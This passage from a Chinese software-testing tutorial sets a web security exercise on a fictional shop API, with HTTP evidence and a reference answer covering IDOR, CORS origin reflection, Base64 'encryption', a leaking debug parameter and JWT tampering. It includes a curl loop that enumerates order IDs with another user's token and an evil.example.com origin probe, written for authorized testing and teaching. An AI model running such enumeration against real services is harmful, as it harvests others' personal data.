Host: api.shop-test.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwidXNlcklkIjoxMDAxLCJyb2xlIjoidXNlciIsImV4cCI6MTg5MzQ1NjAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Accept: application/json
```

响应（注意：用的仍是**用户 A 的令牌**）：

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"orderId":"ORD-20260301-0002","ownerUserId":1002,"status":"paid","amount":2598.00,
 "receiver":"李*","phone":"MTM5MDAxMzgwMDA=","address":"北京市朝阳区**路 66 号",
 "items":[{"skuId":205,"qty":2,"price":1299.00}]}
```

**请求 3：带调试参数再查一次用户 B 的订单**

```http
GET /api/orders/ORD-20260301-0002?debug=1 HTTP/1.1
Host: api.shop-test.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwidXNlcklkIjoxMDAxLCJyb2xlIjoidXNlciIsImV4cCI6MTg5MzQ1NjAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Accept: application/json
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"orderId":"ORD-20260301-0002","ownerUserId":1002,"receiver":"李*",
 "phone":"13900138000","address":"北京市朝阳区某路 66 号",
 "debug":{"sql":"SELECT ... FROM orders WHERE order_id = ?","dbHost":"10.0.3.21:3306"}}
```

**请求 4：跨域探测（模拟浏览器带 Origin 请求）**

```http
GET /api/orders/ORD-20260301-0001 HTTP/1.1
Host: api.shop-test.example.com
Authorization: Bearer <用户A的令牌>
Origin: https://evil.example.com
```

响应头（两次探测结果一致）：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://m.shop-test.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

> 补充对照：管理端接口 `/api/admin/orders/export` 的响应头为 ——
> `Access-Control-Allow-Origin: https://evil.example.com` + `Access-Control-Allow-Credentials: true`
> （即服务端把请求里的 `Origin` 原样回显了）

### 任务要求

请依次完成，并**保留每个请求与响应证据**：

1. **识别**：上面 4 个请求中，哪一个证明了**真正的、可利用的安全问题**？它属于 OWASP Top 10（2021）中的哪一类？请写出最小化的复现步骤。
2. **判定**：开发自查报告里提到的两条（**CORS 配置过宽**、**响应头暴露中间件版本**），逐条判定"是/不是漏洞"，并说明依据。再判定请求 4 中 `/api/orders/...` 与 `/api/admin/orders/export` 两处 CORS 配置**分别**是否构成漏洞，为什么结论不同。
3. **验证（编码与敏感信息）**：响应里的 `phone` 字段是 `MTM4MDAxMzgwMDA=`，前端的做法是 JavaScript `atob()` 还原后显示。请说明：这串值能否被还原成原始手机号？"服务端做了编码"能否算作对手机号的**加密保护**？请求 3 的 `?debug=1` 让问题发生了什么变化？
4. **验证（越权可利用性）**：结合订单号的命名规则 `ORD-<日期>-<4位序号>`，说明攻击者能否**批量获取**他人数据，并给出你的验证构造（不需要真的跑全量，给出可证明规模的方法即可）。
5. **产出**：写一条可直接加入团队安全检查清单的结论（含复测方案），要求指向**具体字段/参数**，而不是"存在安全风险"。

### 提交物

| 产出 | 要求 |
|------|------|
| 证据 | 请求/响应报文，标出关键字段（订单号、`ownerUserId`、令牌声明、`Origin`/`ACAO`、`phone`） |
| 判定 | 明确"是/不是漏洞"+ 依据，不能模棱两可 |
| 编码验证 | `phone` 字段的还原过程与结论（含 `atob` / `base64 -d` 结果） |
| 结论 | 用 3-5 句话说明：风险等级、影响范围、修复建议 |

### 完成标准

- [ ] 能区分真漏洞与误报，并给出判断依据（而不是"扫描器报了就算漏洞"）
- [ ] 结论指向具体字段/参数（如 `orderId`、`access-control-allow-origin`、`phone`），不是笼统的"存在安全风险"
- [ ] 说明了 `MTM4MDAxMzgwMDA=` 的还原过程，并明确 **Base64 是编码不是加密**
- [ ] 对两处 CORS 配置给出了**不同**判定，并说清"固定白名单"与"回显 Origin"的区别
- [ ] 给出了可量化的批量枚举验证方案，并写明复测时要重放的请求

??? tip "参考答案与思路（先自己做完再看）"

    **第 1 题：真漏洞是"水平越权（IDOR）"**

    请求 2 就是铁证：**令牌是用户 A 的，返回的却是用户 B 的订单（`ownerUserId: 1002`）**。

    原理与判定依据：

    - `orderId` 是客户端可控的**对象标识符**，服务端只校验了"这个令牌有没有登录"（认证），没有校验"这个订单是不是属于令牌对应的用户"（**对象级授权**）。
    - 这属于 **OWASP Top 10 (2021) A01：失效的访问控制**（Broken Access Control），细分类型为**水平越权 / IDOR**（Insecure Direct Object Reference）。
    - **为什么能成功**：`ownerUserId`（1002）与令牌里的 `userId`（1001）明确不一致。一个正确实现的接口，此时应返回 **403** 或 **404**（用 404 可避免泄露资源是否存在），而不是返回数据。返回 200 + 完整业务数据 = 授权校验缺失。

    最小复现步骤：

    ```
    1. 用用户 A 登录，拿到令牌，正常请求自己的订单 → 200，ownerUserId=1001
    2. 仅把路径中的 orderId 改成用户 B 的订单号 → 仍用 A 的令牌
    3. 观察：返回 200 且返回 B 的收货人、手机号、地址 → 越权成立
    ```

    影响范围要写到具体字段：泄露的是**收货人姓名、手机号、收货地址、订单金额与商品明细**——属于个人敏感信息，一旦可批量获取，就是一次**数据泄露事件**，不只是"功能 Bug"。

    **第 2 题：两条扫描结果的判定**

    | 扫描器报告项 | 判定 | 依据 |
    |------|------|------|
    | CORS 配置过宽 | **不是漏洞（在 `/api/orders/...` 上）** | `Access-Control-Allow-Origin` 返回的是**固定的可信白名单** `https://m.shop-test.example.com`，并没有回显请求方传入的 `Origin`。请求 4 用 `Origin: https://evil.example.com` 探测，响应里的 `ACAO` **仍然是白名单值**，说明攻击者源拿不到授权。因此 `evil.example.com` 的页面无法读取该响应 |
    | 响应头暴露 `Server: nginx/1.24.0`、`X-Powered-By: Express` | **是信息泄露，但属于 Low/加固建议，不该按"中危漏洞"排期** | 这两行确实暴露了服务端与框架信息，可被攻击者用于比对公开漏洞库（配合 A06 脆弱过时组件）。但它**本身不构成可利用漏洞**，不授予任何访问能力。处理方式应是"**收尾时顺手关掉**"（Nginx `server_tokens off`、Express `app.disable('x-powered-by')`），而不是当成一条中危缺陷单独走修复流程 |

    **两处 CORS 配置为什么结论不同（这是本题的核心考点）：**

    - `/api/orders/...`：`ACAO` = **固定白名单**。虽然带了 `Access-Control-Allow-Credentials: true`，但只有白名单里的源能读到响应。**这是合规配置，不是漏洞。**
    - `/api/admin/orders/export`：`ACAO` = **回显了请求方的 `Origin`（`https://evil.example.com`）**，且同时 `ACAC: true`。这才是**真漏洞**：任意攻击者页面都能带着受害者 Cookie 读取管理端导出接口的响应，等于绕过同源策略直接读数据。

    关键原理（务必记准）：

    > **CORS 不是访问控制机制。** 它只决定"浏览器是否允许跨域 JS 读取响应内容"，**不负责拒绝请求**——请求该发还是会发到服务端，服务端该鉴权还得自己鉴权。所以：
    > - 固定的可信白名单 + `ACAC: true` → **正常**；
    > - **动态回显** 任意 `Origin`（或 `null`、或 `*` 配 `ACAC: true`）+ `ACAC: true` → **漏洞**。
    >
    > 需要注意的是：**"回显 Origin"本身不必然是漏洞。** 当服务端需要支持多个前端域名时，标准做法就是读取请求的 `Origin`、**与允许列表比对**、命中后才把它回显到 `ACAO`（并带回 `Vary: Origin` 以便缓存正确区分）。所以判定时要看**有没有做校验**：本任务中把 `Origin` 改成 `https://evil.example.com` 后响应**照样回显了它**，说明服务端根本没有比对允许列表——这才成立为漏洞。如果文档里 `ACAO` 回显的值恰好是白名单内的域名，就不能这么报。
    >
    > 另外：`*` 与 `Access-Control-Allow-Credentials: true` **不能同时生效**，浏览器会直接报 `CORSNotSupportingCredentials` 错误并拒绝该响应——所以看到"`ACAO: *` 且 `ACAC: true`"时，要么实际回显了 Origin，要么配置本身无效（等于接口废了），需要实测确认，不要臆断。
    >
    > `ACAO: null` 同样危险：`data:`、`file:` 以及沙箱化文档的源都会序列化为 `null`，任何站点都能构造出 `null` 源文档来读取响应，因此规范明确不建议使用 `null`。

    顺带纠正两个常见误判（本教程读者最容易写错的点）：

    - `SameSite=Lax` **不等于**严格的 CSRF 防护。Lax 属于"默认档"：它允许**顶层导航**（即在地址栏输入 URL、点击链接跳转这类 top-level GET）携带 Cookie，只对跨站的**非安全方法**（POST/PUT/DELETE 等）收紧。因此像 `GET /change-password?new=xxx` 这种把写操作做成 GET 的接口，在 Lax 下依然可能被 CSRF 利用——"有 SameSite 就没 CSRF"是错判。要严格防护，需 `SameSite=Strict`，或更可靠的**服务端 CSRF Token**。**验证方式**：不要只看属性名，实际构造一个从第三方页面发起的请求，观察服务端是否执行了操作。
    - `HttpOnly` 防的是 **XSS 通过 `document.cookie` 读取 Cookie**，**不防 CSRF**（CSRF 场景下浏览器自动带 Cookie，根本不需要脚本读得到它）。看到"缺 `HttpOnly`"就报 CSRF，是把两个机制搞反了。

    **第 3 题：Base64 可逆，不是加密**

    先还原：

    ```bash
    echo "MTM4MDAxMzgwMDA=" | base64 -d
    # 输出：13800138000
    ```

    ```javascript
    atob("MTM4MDAxMzgwMDA=")   // "13800138000"
    ```

    **结论**：

    - `MTM4MDAxMzgwMDA=` 是 `13800138000` 的 **Base64 编码**。Base64 是**可逆的编码方式（encoding）**，**无密钥、任何人可解**，与"加密（encryption）"不是一回事。把手机号做 Base64 后放在响应里，**等同于明文返回**。
    - 因此这**不构成对敏感数据的保护**，应归入 **OWASP Top 10 (2021) A02：加密失败（Cryptographic Failures）**——敏感数据在传输/存储时未获得有效保护。
    - 判定要点：判断"是不是有效保护"，看的是**是否可被无密钥还原**。只要无密钥就能还原（Base64、URL 编码、十六进制、简单字符替换、`atob`/`btoa` 而已），就**不是加密**。

    `?debug=1` 让问题发生的变化：

    - 服务端在调试模式下**直接返回了明文手机号**（`"phone":"13900138000"`），并把完整收货地址也还原成明文，说明"Base64"只是前端的显示层伪装，**服务端本就持有并可输出明文**。
    - 更要命的是 `debug` 里回显了 **SQL 语句与数据库地址（`dbHost: 10.0.3.21:3306`）**——这属于典型的**生产环境调试接口未关闭**，命中 **A05：安全配置错误**，并为后续攻击提供了内网信息。这条的严重程度**高于** Base64 那一条，是本题里除越权之外最该优先修的问题。

    **第 4 题：批量枚举的可利用性**

    订单号是 `ORD-<8位日期>-<4位序号>`，例如 `ORD-20260301-0002`。

    - 日期部分：常见的取值空间是"近 N 天"，业务上线后一般只有有限个活跃日期，容易穷举（如取最近 90 天）。
    - 序号部分：只有 **4 位**，单日空间仅 `0000`–`9999`（1 万种）。
    - 于是**单日全量枚举约 1 万次请求**即可覆盖；取 30 个日期约 30 万次请求——对接口扫描来说完全可行。
    - 结合请求 2 的结论（任意订单号都返回数据），这意味着攻击者**不需要任何权限提升**，只靠一个普通账号即可**批量拖库订单的个人信息**。

    验证构造（在授权环境、控制频率前提下）：

    ```bash
    # 固定用用户 A 的令牌，只枚举 orderId
    for d in $(seq -w 1 3); do
      for i in $(seq -w 0 9999); do
        curl -s -o /dev/null -w "%{http_code}\n" \
          -H "Authorization: Bearer <用户A的令牌>" \
          "https://api.shop-test.example.com/api/orders/ORD-20260301-$i"
      done
    done
    # 统计 200 的数量：应显著大于 0，说明他人订单一并被读出
    ```

    > ⚠️ 只做**抽样证明**（例如抽 10 个相邻序号，确认其中出现 `ownerUserId != 1001` 的记录）即可判定漏洞成立，**不要真的跑全量**，避免变成对生产系统的批量数据抓取。

    **更关键的一点：不要用"可枚举性"来给这个漏洞定级。** 即使用户把订单号换成 UUID（不可枚举），**漏洞依然存在**——只要 `ownerUserId` 与令牌 `userId` 不一致还能拿到数据，就是越权。可枚举性只影响**影响范围的大小**，不影响**漏洞是否成立**。所以修复方向必须是"**补对象级授权校验**"，而不是"把 ID 改成 UUID 藏起来"。

    **关于 JWT 篡改（一个高频误判，顺手纠正）**

    有同学看到 JWT 前两段能被 Base64 解开，就认为"改一下 `userId` 成 1002 就能越权"。实测会失败：

    ```
    把 payload 的 userId 由 1001 改成 1002，第三段签名保持不变
    → 服务端用密钥重算签名，与请求里的签名不一致 → 返回 401
    ```

    原因：**JWT 的签名保护的是完整性（防篡改），Base64 的可读性保护的是"可读"而非"可改"。** 两者不矛盾——"令牌内容能被看见"和"令牌内容能被修改"是完全不同的两件事。这也再次说明：**Base64 ≠ 加密**，但也 **≠ 可篡改**。

    例外情况（真漏洞的形态）：若服务端把签名算法交给客户端决定（`alg` 可改为 `none`）或使用了弱密钥（可离线爆破），则签名失效、令牌真可伪造。这属于 **A02/A07** 范畴，需要单独验证 `alg: none` 与弱密钥两条路径——但本题数据中未出现该迹象，**不要无故上报**。

    **第 5 题：可加入检查清单的结论**

    ```
    【检查项】订单/订单类资源接口的对象级授权（越权）
    【检查对象】所有以业务 ID 作为路径或查询参数的接口，
                重点关注 GET /api/orders/{orderId}、GET /api/users/{id} 这类形态
    【复测方案】
      1. 用用户 A 的令牌请求用户 A 自己的资源 → 记录基线响应
      2. 仅替换路径中的业务 ID 为用户 B 的资源 ID，令牌保持不变
      3. 判定标准：
         - 返回 B 的数据（200 + ownerUserId 与令牌 userId 不一致）→ 存在水平越权，Critical
         - 返回 403 / 404 且响应体不含 B 的任何字段 → 通过
      4. 附加验证：把业务 ID 换成不存在的 ID，确认不泄露 SQL、堆栈、内网地址
    【同批必查】
      - 响应敏感字段（phone、address、idCard）必须是脱敏值（如 138****8000），
        不接受 Base64/URL 编码等可逆编码充当"保护"
      - 生产环境禁止响应 ?debug=1、?debug=true 等调试参数，
        确认响应体不含 sql、dbHost、stack 等字段
      - CORS：ACAO 必须是固定白名单；出现"回显请求 Origin"或 "null" 即为 Critical
    【修复建议】
      - 服务端在查询层强制追加归属条件 WHERE order_id = ? AND owner_user_id = <令牌中的 userId>，
        或在业务层做对象级授权校验，禁止只靠前端隐藏入口
      - 关闭生产 debug 参数与 server_tokens / x-powered-by
      - 敏感字段在序列化层统一脱敏，不以 Base64 代替脱敏或加密
    【等级建议】水平越权 Critical（可批量获取他人个人信息）；
              生产 debug 暴露 SQL/DB 地址 High；
              Base64 "伪加密" 视为敏感信息未保护 Medium；
              响应头版本信息 Low（加固项，不单独阻塞发布）
    ```

---

### 推荐下一步

根据你的学习进度，选择下一步：

1. **如果你想做接口测试实战**：进入 [接口自动化项目实战](../项目实战/接口自动化项目实战.md)，搭建完整测试框架
2. **如果你想进入自动化**：学习 [Python 接口自动化](../自动化测试/Python+Requests+Allure接口自动化教程-软件测试版.md)，用 Requests + Pytest 搭框架
3. **如果你想做电商实战**：进入 [电商系统测试实战](../项目实战/电商系统测试实战.md)，体验完整测试流程

### 阶段测验

完成教程后，建议做 [Web 安全测试测验](Web安全测试测验.md) 检验学习效果。

### 通关检查

完成本阶段后，使用 [第3阶段-专项测试通关](../学习中心/第3阶段-专项测试通关.md) 检查是否可以进入下一阶段。
